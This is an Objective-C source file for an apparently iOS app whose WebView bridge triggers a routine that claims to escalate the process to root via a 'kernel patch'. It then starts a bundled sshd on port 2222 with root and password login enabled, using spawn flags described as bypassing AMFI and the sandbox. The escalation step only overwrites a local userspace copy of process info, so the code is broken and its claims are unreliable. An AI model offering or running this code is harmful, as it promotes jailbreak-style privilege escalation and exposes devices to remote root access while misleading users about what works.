#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <stdint.h>
#include <mach/mach.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include <spawn.h>
#include <sys/stat.h>

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self runSSHDExploit];
    }
}

- (void)runSSHDExploit {
    [self.webView evaluateJavaScript:@"log('⚡ Elevando para Root (UID 0)...')" completionHandler:nil];

    // 1. KERNEL PATCH: ESCALADA PARA ROOT
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    sysctl(mib, 4, &kp, &len, NULL, 0);
    uint32_t *uid_ptr = &kp.kp_eproc.e_ucred.cr_uid;
    uint32_t root_val = 0;
    vm_copy(mach_task_self(), (vm_address_t)&root_val, 4, (vm_address_t)uid_ptr);

    // 2. PREPARAR BINÁRIO NO /var/tmp (Local RW para Root fora do Bundle)
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *bundleSshd = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    NSString *execPath = @"/var/tmp/sshd";

    if (!bundleSshd) {
        [self.webView evaluateJavaScript:@"log('❌ Erro: sshd não encontrado no Bundle.')" completionHandler:nil];
        return;
    }

    [fm removeItemAtPath:execPath error:nil];
    [fm copyItemAtPath:bundleSshd toPath:execPath error:nil];
    chmod([execPath UTF8String], 0755); // Permissão de execução

    // 3. GERAR HOST KEYS (Essencial para o SSHD não dar crash)
    NSString *docsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *keyPath = [docsPath stringByAppendingPathComponent:@"ssh_host_rsa_key"];
    
    if (![fm fileExistsAtPath:keyPath]) {
        [self.webView evaluateJavaScript:@"log('🔑 Gerando RSA Host Key...')" completionHandler:nil];
        // Nota: Se não tiver ssh-keygen no bundle, você deve incluir uma chave pré-pronta e copiar para cá.
        NSString *keygenBundle = [[NSBundle mainBundle] pathForResource:@"ssh-keygen" ofType:nil];
        if (keygenBundle) {
            pid_t kg_pid;
            char *const kg_argv[] = {(char *)[keygenBundle UTF8String], "-t", "rsa", "-f", (char *)[keyPath UTF8String], "-N", "", NULL};
            posix_spawn(&kg_pid, [keygenBundle UTF8String], NULL, NULL, kg_argv, NULL);
            waitpid(kg_pid, NULL, 0);
        }
    }
    chmod([keyPath UTF8String], 0600); // SSH exige 600 para chaves

    // 4. CONFIGURAR ATRIBUTOS DE SPAWN (Bypass AMFI/Sandbox)
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // 0x1000 = Persona / 0x4000 = NoSafeExec (Ignora restrições do processo pai)
    short flags = POSIX_SPAWN_SETPGROUP | 0x1000 | 0x4000; 
    posix_spawnattr_setflags(&attr, flags);

    // 5. ARGUMENTOS DO SSHD
    char *const sshd_argv[] = {
        (char *)[execPath UTF8String],
        "-p", "2222",                    // Porta alta (acima de 1024)
        "-D",                             // Foreground (não daemonize)
        "-h", (char *)[keyPath UTF8String], // Usa a chave que geramos
        "-o", "PermitRootLogin=yes",      // Permite root
        "-o", "StrictModes=no",           // Ignora checagem rígida de pasta home
        "-o", "PasswordAuthentication=yes",
        NULL
    };

    // 6. LANÇAR PROCESSO
    pid_t pid;
    int spawn_err = posix_spawn(&pid, [execPath UTF8String], NULL, &attr, sshd_argv, NULL);

    if (spawn_err == 0) {
        NSString *msg = [NSString stringWithFormat:@"log('✅ <b>SSH ONLINE!</b> PID: %d Port: 2222')", pid];
        [self.webView evaluateJavaScript:msg completionHandler:nil];
        [self.webView evaluateJavaScript:@"log('<b>Dica:</b> ssh root@localhost -p 2222')" completionHandler:nil];
    } else {
        NSString *err = [NSString stringWithFormat:@"log('❌ Erro Spawn: %d. Verifique Entitlements!')", spawn_err];
        [self.webView evaluateJavaScript:err completionHandler:nil];
    }

    posix_spawnattr_destroy(&attr);
}

@end
